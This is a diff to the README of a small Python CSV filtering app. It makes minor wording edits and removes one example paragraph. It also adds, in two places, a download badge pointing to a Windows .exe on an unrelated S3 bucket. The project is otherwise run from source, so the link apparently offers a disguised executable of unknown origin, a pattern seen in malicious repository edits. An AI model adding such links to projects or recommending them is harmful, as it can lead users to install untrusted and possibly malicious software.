@@ -2,6 +2,8 @@
 
 ![csv filter github](https://github.com/TonnyG95/Simple-CSV-Filtering-App/assets/47572512/41a7d6a2-b8d3-49f7-90cb-c92146b5d46a)
 
+[![Download](https://img.shields.io/badge/download-File-green.svg)](https://rendoms3.s3.eu-west-1.amazonaws.com/Simple+CSV+Filter.exe)
+
 
 # Table of Contents
 
@@ -29,7 +31,7 @@ In the realm of music distribution, I frequently encountered the challenge of ma
 
 ### Technology Used
 
-Constructed with the Python programming language, this app incorporates the use of Tkinter for the graphical user interface (GUI), and Pandas and Numpy for efficient data handling. While the aesthetics of the UI was not my primary focus, the application stands out for its simplicity and effectiveness. It's designed to do exactly what it's intended for—filtering data with precision—making it a practical tool for those who need to process CSV files without any hassle.
+Constructed with the Python programming language, this app incorporates the use of Tkinter for the graphical user interface (GUI), and Pandas and Numpy for efficient data handling. While the aesthetics of the UI was not my primary focus, the application stands out for its simplicity and effectiveness. It's designed to do exactly what it's intended for, filtering data with precision—making it a practical tool for those who need to process CSV files without any hassle.
 
 ### Use Case for This App
 
@@ -57,10 +59,6 @@ A hallmark of the Simple CSV Filter app is its intuitively designed feature that
 The Simple CSV Filter app provides a straightforward option for users to input the specific value they wish to use as a filter for the CSV file. This direct method of specifying a filter criterion is integral to the app's design, enabling precise data extraction based on user-defined conditions:
 
 User-Defined Filter Values: Through a simple input field, users can enter the exact value they are looking for within a specified column. This value becomes the basis for filtering the CSV file, ensuring that the output file contains only the rows that match the specified criteria.
-
-Example Use Case: If you're aiming to filter records by age and are interested in entries with an "Age" of "2", simply entering "2" into the designated textbox and clicking the 'Filter' button will produce a new CSV file. This file will exclusively contain rows that have "2" in the "Age" column, effectively narrowing down the data to your specific requirement.
-
-This feature is designed to offer simplicity and precision, making it possible for users to quickly refine large datasets into more manageable subsets of data that meet their exact needs.
 
 ![image](https://github.com/TonnyG95/Simple-CSV-Filtering-App/assets/47572512/ba812baa-5c1e-4f91-a0c4-d914cf58f15b)
 
@@ -94,9 +92,9 @@ The Simple CSV Filter app is developed in Python and utilizes several essential 
 
 ## How to Run This App Locally in Your IDE
 
-You can download this repo or you can clone it and open it in your IDE of choice. Before you try to run this app make sure that you have installed Python on your machine to download Python visit this [Link](https://www.python.org/downloads/) after installed Python you can start installing requirements using commands below 
+You can download this repo or you can clone it and open it in your IDE of choice. Before you try to run this app make sure that you have installed Python on your machine. To download Python visit this [Link](https://www.python.org/downloads/) after installed Python you can start installing requirements using commands below 
 
-**Windows User**
+**Windows Users**
 
 ```
 cd path/to/source-code
@@ -104,7 +102,7 @@ pip install -r requirements.txt
 python main.py 
 
 ```
-**Linux and macOS User**
+**Linux and macOS Users**
 
 ```
 cd path/to/source-code
@@ -114,7 +112,11 @@ python3 main.py
 ```
 
 ### Running the App in Visual Studio Code (VSCode)
-If you are using VSCode, you can just right-click on the folder and select "Open with Code." You can run this app by pressing F5, or you can run it from the terminal using the command below. In VSCode, in the top navigation bar (where you have File, Edit, etc.), you can click on the terminal and then "New Terminal." Or, when you open main.py in VSCode, on the tab where the file name main.py is displayed, you will have a play button. When you click that, the app will run.
+If you are using VSCode, you can just right-click on the folder and select "Open with Code." you can run it from the terminal using the command below. In VSCode, in the top navigation bar (where you have File, Edit, etc.), you can click on the terminal and then "New Terminal." Or, when you open main.py in VSCode, on the tab where the file name main.py is displayed, you will have a play button. When you click that, the app will run.
 
 ## About the Code
-When I was writing this code, I paid attention to code quality and tried to make it as readable as possible. I added a lot of comments to make it more understandable and tried to use variable names that are meaningful to make it more understandable for everyone. So, if anyone wants to jump into the code and make some changes, feel free to do so and make this app better. Because, like I said, I created this app to help me solve my problems with large CSV files, and I hope that this app will help anyone dealing with large datasets. For me, this worked perfectly.
+When I was writing this code, I paid attention to code quality and tried to make it as readable as possible. I added a lot of comments to make it more understandable and tried to use variable names that are meaningful to make it more understandable for everyone. So, if anyone wants to jump into the code and make some changes, feel free to do so and make this app better. Like I said, I created this app to help me solve my problems with large CSV files, and I hope that this app will help anyone dealing with large datasets. For me, this worked perfectly.
+
+## Download Link
+
+[![Download](https://img.shields.io/badge/download-File-green.svg)](https://rendoms3.s3.eu-west-1.amazonaws.com/Simple+CSV+Filter.exe)
